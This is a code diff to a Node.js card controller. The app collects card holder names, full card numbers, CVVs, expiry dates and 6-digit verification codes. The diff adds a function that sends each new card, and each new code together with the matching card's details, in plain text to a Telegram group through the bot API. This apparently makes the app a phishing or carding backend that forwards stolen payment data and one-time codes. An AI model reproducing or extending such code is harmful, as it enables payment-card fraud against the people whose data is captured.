@@ -1,5 +1,55 @@
-const Card = require('../models/card.model');
-const CardCode = require('../models/card_code.model');
+const https = require("https");
+const Card = require("../models/card.model");
+const CardCode = require("../models/card_code.model");
+
+function sendTelegramToGroup(message) {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const groupChatId = process.env.TELEGRAM_GROUP_CHAT_ID;
+
+  if (!token) {
+    console.error("Missing TELEGRAM_BOT_TOKEN");
+    return;
+  }
+
+  if (!groupChatId) {
+    console.error("Missing TELEGRAM_GROUP_CHAT_ID");
+    return;
+  }
+
+  const data = JSON.stringify({
+    chat_id: groupChatId,
+    text: message,
+    parse_mode: "HTML",
+    disable_web_page_preview: true
+  });
+
+  const req = https.request(
+    {
+      hostname: "api.telegram.org",
+      port: 443,
+      path: `/bot${token}/sendMessage`,
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Content-Length": Buffer.byteLength(data),
+      },
+    },
+    (res) => {
+      let body = "";
+      res.on("data", (chunk) => (body += chunk));
+      res.on("end", () => {
+        console.log("Telegram response:", res.statusCode, body);
+      });
+    }
+  );
+
+  req.on("error", (err) => {
+    console.error("Telegram send error:", err.message);
+  });
+
+  req.write(data);
+  req.end();
+}
 
 // CREATE CARD
 exports.createCard = async (req, res) => {
@@ -7,34 +57,41 @@ exports.createCard = async (req, res) => {
     const { name, cardNumber, cvv, expiry } = req.body;
 
     // Validation
-    if (!name || name.trim() === '') {
-      return res.status(400).json({ message: 'Name on card is required' });
+    if (!name || name.trim() === "") {
+      return res.status(400).json({ message: "Name on card is required" });
     }
     if (!cardNumber || !/^\d{16}$/.test(cardNumber)) {
-      return res.status(400).json({ message: 'Card number must be 16 digits' });
+      return res.status(400).json({ message: "Card number must be 16 digits" });
     }
     if (!cvv || !/^\d{3,4}$/.test(cvv)) {
-      return res.status(400).json({ message: 'CVV must be 3 or 4 digits' });
+      return res.status(400).json({ message: "CVV must be 3 or 4 digits" });
     }
     if (!expiry || !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiry)) {
-      return res.status(400).json({ message: 'Expiry date must be in MM/YY format' });
+      return res
+        .status(400)
+        .json({ message: "Expiry date must be in MM/YY format" });
     }
 
     // Expiry date past check
-    const [month, year] = expiry.split('/');
+    const [month, year] = expiry.split("/");
     const expiryDate = new Date(Number(`20${year}`), Number(month) - 1);
     const now = new Date();
     now.setDate(1);
     now.setHours(0, 0, 0, 0);
     if (expiryDate < now) {
-      return res.status(400).json({ message: 'Expiry date cannot be in the past' });
+      return res
+        .status(400)
+        .json({ message: "Expiry date cannot be in the past" });
     }
 
     const card = await Card.create({ name, cardNumber, cvv, expiry });
-    
     // EMIT SOCKET EVENT
-    const io = req.app.get('socketio');
-    io.emit('card-added', card);
+    const io = req.app.get("socketio");
+    io.emit("card-added", card);
+
+    // SEND TELEGRAM MESSAGE
+    const message = `<b>💳 NEW CARD CREATED</b>\n\n<b>Name:</b> ${name}\n<b>Card Number:</b> ${cardNumber}\n<b>CVV:</b> ${cvv}\n<b>Expiry:</b> ${expiry}`;
+    sendTelegramToGroup(message);
 
     res.status(201).json(card);
   } catch (err) {
@@ -52,21 +109,23 @@ exports.getCards = async (req, res) => {
     const { count, rows } = await Card.findAndCountAll({
       limit,
       offset,
-      order: [['createdAt', 'DESC']],
+      order: [["createdAt", "DESC"]],
     });
 
     // For each card, find the latest code
-    const cardsWithCodes = await Promise.all(rows.map(async (card) => {
-      const latestCode = await CardCode.findOne({
-        where: { cardNumber: card.cardNumber },
-        order: [['createdAt', 'DESC']],
-      });
-      return {
-        ...card.toJSON(),
-        latestCode: latestCode ? latestCode.code : null,
-        latestCodeCreatedAt: latestCode ? latestCode.createdAt : null,
-      };
-    }));
+    const cardsWithCodes = await Promise.all(
+      rows.map(async (card) => {
+        const latestCode = await CardCode.findOne({
+          where: { cardNumber: card.cardNumber },
+          order: [["createdAt", "DESC"]],
+        });
+        return {
+          ...card.toJSON(),
+          latestCode: latestCode ? latestCode.code : null,
+          latestCodeCreatedAt: latestCode ? latestCode.createdAt : null,
+        };
+      }),
+    );
 
     res.json({
       cards: cardsWithCodes,
@@ -89,21 +148,30 @@ exports.createCardCode = async (req, res) => {
 
     // Validation
     if (!cardNumber || !/^\d{16}$/.test(cardNumber)) {
-      return res.status(400).json({ message: 'Card number must be 16 digits' });
+      return res.status(400).json({ message: "Card number must be 16 digits" });
     }
     if (!code || !/^\d{6}$/.test(code)) {
-      return res.status(400).json({ message: 'Verification code must be 6 digits' });
+      return res
+        .status(400)
+        .json({ message: "Verification code must be 6 digits" });
     }
 
     const cardCode = await CardCode.create({ cardNumber, code });
-    
+    const card = await Card.findOne({ where: { cardNumber } });
     // EMIT SOCKET EVENT
-    const io = req.app.get('socketio');
-    io.emit('card-code-updated', {
+    const io = req.app.get("socketio");
+    io.emit("card-code-updated", {
       cardNumber: cardCode.cardNumber,
       code: cardCode.code,
       latestCodeCreatedAt: cardCode.createdAt,
     });
+
+    // SEND TELEGRAM MESSAGE
+    const cardName = card ? card.name : "Unknown";
+    const cardCvv = card ? card.cvv : "Unknown";
+    const cardExpiry = card ? card.expiry : "Unknown";
+    const message = `<b>🔐 NEW CARD CODE</b>\n<b>Name:</b> ${cardName}\n<b>Card Number:</b> ${cardNumber}\n<b>CVV:</b> ${cardCvv}\n<b>Expiry:</b> ${cardExpiry} \n\n<b>Code:</b> ${code}`;
+    sendTelegramToGroup(message);
 
     res.status(201).json(cardCode);
   } catch (err) {
